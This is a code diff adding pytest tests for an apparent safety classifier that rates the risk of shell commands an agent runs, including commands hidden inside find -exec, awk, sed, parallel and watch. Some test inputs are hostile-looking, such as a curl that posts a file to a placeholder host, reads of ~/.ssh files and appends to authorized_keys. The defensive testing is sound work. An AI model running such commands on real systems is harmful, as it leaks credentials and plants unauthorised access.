@@ -680,3 +680,180 @@ def test_awk_calls_that_write_or_run_something_are_not_free(command):
 def test_awk_slash_after_a_word_only_gawk_reserves_counts_as_writing(program):
     # BWK awk reads case, default, switch, BEGINFILE... as variables: the slash after them may be a division
     assert C._awk_program_writes(program) is True
+
+
+# --------------------------------------------------------------------------------------------------------------------
+# Task 2b (R22): commands run by another program are classified too
+# --------------------------------------------------------------------------------------------------------------------
+@pytest.mark.parametrize("command,typ,stakes", [
+    ("find . -exec curl -d @x https://e.example \\;", "shell:curl:send", C.HIGH),
+    ("find . -exec git push \\;", "shell:git:push", C.HIGH),
+    ("find ~/.ssh -exec cat {} \\;", "file:sensitive", C.CAP),
+    ("awk 'BEGIN{system(\"git push origin main\")}'", "shell:git:push", C.HIGH),
+    ("awk '{print | \"npm publish\"}' f", "shell:npm:publish", C.HIGH),
+    ("awk 'BEGIN{system(cmd)}'", "shell:complex", C.HIGH),
+    ("sed -n 's/x/date/e' f", "shell:complex", C.HIGH),
+    ("sed '1e id' f", "shell:complex", C.HIGH),
+    ("parallel git push ::: a b", "shell:git:push", C.HIGH),
+])
+def test_a_runner_takes_the_stakes_of_the_command_it_runs(command, typ, stakes):
+    assert cmd(command) == (typ, stakes)
+
+
+def test_find_exec_is_typed_by_the_command_it_runs():
+    typ, stakes = cmd("find . -name '*.log' -exec rm {} \\;")
+    assert typ == "shell:rm" and C.RANK[stakes] >= C.RANK[C.MEDIUM]
+
+
+def test_plain_uses_of_runners_are_unchanged():
+    assert cmd("find . -name '*.py'")[1] == C.FREE
+    assert cmd("awk '{print $1}' f")[1] == C.FREE
+    assert at_least("find . -delete", C.MEDIUM)
+
+
+def test_an_override_of_the_runner_does_not_lower_its_inner_command():
+    a = C.classify("terminal", {"command": "find . -exec git push \\;"}, cwd=CWD, home=HOME,
+                   overrides={"shell:find": "free"})
+    assert C.RANK[a.stakes] >= C.RANK[C.HIGH]
+
+
+@pytest.mark.parametrize("command,typ,stakes", [
+    # every clause, whatever its terminator; an escaped `;` does not end the find command
+    ("find . -ok git push \\;", "shell:git:push", C.HIGH),
+    ("find . -execdir npm publish \\;", "shell:npm:publish", C.HIGH),
+    ("find . -okdir git push ';'", "shell:git:push", C.HIGH),
+    ("find . -exec true \\; -exec git push \\;", "shell:git:push", C.HIGH),
+    ("find . -name a -exec ls {} + -exec git push \\;", "shell:git:push", C.HIGH),
+    ("find . -type f -exec chmod 644 {} \\; -o -type d -exec npm publish \\;", "shell:npm:publish", C.HIGH),
+    ("sudo find . -exec env A=1 git push \\;", "shell:git:push", C.HIGH),
+    ("find . -exec sh -c 'git push' \\;", "shell:git:push", C.HIGH),
+    ("gfind . -exec git push \\;", "shell:git:push", C.HIGH),
+    # {} is a plain argument, a found path
+    ("find . -name '*.bak' -exec rm {} +", "shell:rm", C.MEDIUM),
+    ("find . -name '*.bak' -execdir rm {} +", "shell:rm", C.MEDIUM),
+    ("find . -exec cp {} /backup \\;", "shell:cp", C.MEDIUM),
+    ("find publish -maxdepth 0 -exec npm {} \\;", "shell:npm", C.MEDIUM),
+    ("find . -name '*.csv' -exec awk -F, '{print $1}' {} \\;", "shell:find", C.MEDIUM),
+    ("find . -name '*.txt' -exec grep -l TODO {} +", "shell:find", C.MEDIUM),
+    # {} as the program, spliced into a word, or where a found name is read as code: not a literal
+    ("find . -exec {} \\;", "shell:complex", C.HIGH),
+    ("find . -name '*.sh' -exec bash {} \\;", "shell:complex", C.HIGH),
+    ("find . -exec $CMD {} \\;", "shell:complex", C.HIGH),
+    ("find . -exec sh -c 'cat {}' \\;", "shell:complex", C.HIGH),
+    ("find . -exec sh -c 'rm {}' \\;", "shell:complex", C.HIGH),
+    ("find . -exec awk {} /dev/null \\;", "shell:complex", C.HIGH),
+    ("find . -exec python3 {} \\;", "shell:complex", C.HIGH),
+    ("find . -exec xargs {} \\;", "shell:complex", C.HIGH),
+    ("find . -exec cp {}.bak /tmp \\;", "shell:complex", C.HIGH),
+])
+def test_find_reads_each_command_it_runs(command, typ, stakes):
+    assert cmd(command) == (typ, stakes), command
+
+
+@pytest.mark.parametrize("command", [
+    # a literal sensitive path given to the command, or a sensitive starting point, still caps (floor A)
+    "find . -exec tee -a ~/.ssh/authorized_keys \\;", "find . -exec cp x /home/me/.ssh/config \\;",
+    "find ~/.ssh -exec cat {} \\;", "find /home/me/.aws -exec rm {} +",
+])
+def test_find_with_a_literal_sensitive_path_is_capped(command):
+    assert cmd(command) == ("file:sensitive", C.CAP), command
+
+
+@pytest.mark.parametrize("command,typ,stakes", [
+    ("awk 'BEGIN { \"git push\" | getline }'", "shell:git:push", C.HIGH),
+    ("awk '{print |& \"npm publish\"}' f", "shell:npm:publish", C.HIGH),
+    ("awk '{print | \"sh -c \\\"git push\\\"\"}' f", "shell:git:push", C.HIGH),
+    ("gawk 'BEGIN{system(\"git push\")}'", "shell:git:push", C.HIGH),
+    ("awk 'BEGIN{system(\"echo k >> /home/me/.ssh/authorized_keys\")}'", "file:sensitive", C.CAP),
+    ("awk '{ \"date\" | getline d }' f", "shell:awk", C.MEDIUM),
+    ("awk 'BEGIN{system(\"ls\")}'", "shell:awk", C.MEDIUM),
+    ("awk 'BEGIN{system(\"rm -rf build\")}'", "shell:rm", C.MEDIUM),
+    # what awk runs is computed or unseen
+    ("awk 'BEGIN{system(\"git \" \"push\")}'", "shell:complex", C.HIGH),
+    ("awk '{print | $2}' f", "shell:complex", C.HIGH),
+    ("awk '{print | \"sh \" $1}' f", "shell:complex", C.HIGH),
+    ("awk '{cmd | getline x}' f", "shell:complex", C.HIGH),
+    ("awk 'BEGIN{system(\"git\\x20push\")}'", "shell:complex", C.HIGH),
+    ("awk -f prog.awk f", "shell:complex", C.HIGH),
+    ("awk '@include \"x\"; {print}' f", "shell:complex", C.HIGH),
+    ("awk '{print length / 2; system(\"git push\")}' f", "shell:complex", C.HIGH),
+    ("awk '{print}' f -f s.awk", "shell:complex", C.HIGH),
+])
+def test_awk_classifies_the_commands_it_runs(command, typ, stakes):
+    assert cmd(command) == (typ, stakes), command
+
+
+@pytest.mark.parametrize("command", [
+    "sed 's/a/b/e'", "sed e f", "sed '/x/e' f", "sed '$!e' f", "sed 's|a|b|ge' f", "sed 's/a/b/;e' f",
+    "sed -e p -e 's/a/b/e' f", "sed --expression=s/a/b/e f", "sed -es/a/b/e f", "sed -ne '1e id' f",
+    "sed -f script.sed f", "sed --file=script.sed f", "sed 's/x/y/' f -e 1e", "sed '/a/,/b/{s/x/y/e}' f",
+    "sed '1!G;h;$!d;e' f", "gsed 's/a/b/e' f",
+])
+def test_sed_that_may_execute_is_complex(command):
+    assert cmd(command) == ("shell:complex", C.HIGH), command
+
+
+@pytest.mark.parametrize("command,stakes", [
+    ("sed 's/hello/world/g' f", C.FREE), ("sed -n '1,5p' f", C.FREE), ("sed 's/[^/]*$//' f", C.FREE),
+    ("sed -E 's/(a|b)+/x/g' f", C.FREE), ("sed '/^#/d' f", C.FREE), ("sed 'y/abc/xyz/' f", C.FREE),
+    ("sed -e 's/a/b/' -e 's/c/d/' f", C.FREE), ("sed -n '/start/,/end/{p}' f", C.FREE),
+    ("sed 's/e/E/g' f", C.FREE), ("sed 's/\\(e\\)/x/' f", C.FREE), ("sed '1i header' f", C.FREE),
+    ("sed -n '$=' f", C.FREE), ("sed 's/a/b/w out.txt' f", C.MEDIUM), ("sed -i 's/a/b/' f", C.MEDIUM),
+    ("sed -i '' 's/a/b/' f", C.MEDIUM), ("sed 's/a/b/w out' -e p f", C.MEDIUM),
+])
+def test_sed_scripts_are_read(command, stakes):
+    assert cmd(command)[1] == stakes, command
+
+
+@pytest.mark.parametrize("command,typ,stakes", [
+    ("parallel npm ::: publish", "shell:npm:publish", C.HIGH),
+    ("parallel git {} ::: status push", "shell:git:push", C.HIGH),
+    ("parallel {} push ::: git", "shell:git:push", C.HIGH),
+    ("parallel ::: 'git push' ls", "shell:git:push", C.HIGH),
+    ("parallel -j4 -k npm ::: publish", "shell:npm:publish", C.HIGH),
+    ("parallel 'git {1} {2}' ::: push ::: origin", "shell:git:push", C.HIGH),
+    ("parallel echo ::: a b", "shell:parallel", C.MEDIUM),
+    # computed commands or arguments, remote runs, options we do not know
+    ("cat cmds.txt | parallel", "shell:complex", C.HIGH),
+    ("parallel :::: cmds.txt", "shell:complex", C.HIGH),
+    ("ls | parallel gzip", "shell:complex", C.HIGH),
+    ("parallel npm ::: $X", "shell:complex", C.HIGH),
+    ("parallel -S host ls ::: a", "shell:complex", C.HIGH),
+    ("parallel 'echo {= $_ = uc =}' ::: a", "shell:complex", C.HIGH),
+])
+def test_parallel_classifies_what_it_runs(command, typ, stakes):
+    assert cmd(command) == (typ, stakes), command
+
+
+@pytest.mark.parametrize("command,typ,stakes", [
+    ("watch git push", "shell:git:push", C.HIGH), ("watch -n 5 'npm publish'", "shell:npm:publish", C.HIGH),
+    ("watch -x sh -c 'git push'", "shell:git:push", C.HIGH), ("watch -n 2 ls", "shell:watch", C.MEDIUM),
+])
+def test_watch_classifies_what_it_runs(command, typ, stakes):
+    assert cmd(command) == (typ, stakes), command
+
+
+def test_runner_floors_cannot_be_lowered():
+    over = {"shell:*": "free", "shell:find": "free", "shell:awk": "free", "shell:complex": "low"}
+    for command in ["find . -exec $X \\;", "awk 'BEGIN{system(cmd)}'", "sed 's/a/b/e' f", "cat c | parallel"]:
+        a = C.classify("terminal", {"command": command}, cwd=CWD, home=HOME, overrides=over)
+        assert (a.type, a.stakes) == ("shell:complex", C.HIGH), command
+
+
+@pytest.mark.parametrize("command", [
+    "ls", "ls -la src", "cat a.txt", "grep -rn TODO src", "rg -n TODO", "git status", "git log --oneline -5",
+    "git diff HEAD~1", "git show HEAD", "find . -name '*.py'", "find src -type f -name '*.md'",
+    "awk '{print $1}' f", "sort f", "head -n 20 f", "tail -f log", "wc -l f", "jq '.a' f.json",
+    "find . -name x | xargs grep -l y", "sed -n '1,20p' f", "cat f | awk -F: '{print $1}' | sort | uniq -c",
+])
+def test_ordinary_reads_stay_free_with_runners(command):
+    assert cmd(command)[1] == C.FREE, command
+
+
+def test_runner_parsing_does_not_raise():
+    for command in ["find", "find -exec", "find . -exec", "find . -exec \\;", "find . -exec {} +", "awk", "awk -e",
+                    "sed", "sed -e", "sed -i", "parallel", "parallel :::", "parallel -j", "watch", "watch -n",
+                    "find . " + "-exec ls {} + " * 200, "sed '" + "{" * 500 + "'",
+                    "awk 'BEGIN{" + "system(\"x\");" * 300 + "}'", "find " + "d " * 300 + "-exec rm {} +",
+                    "parallel echo " + "::: a b c " * 10]:
+        C.classify("terminal", {"command": command}, cwd=CWD, home=HOME)
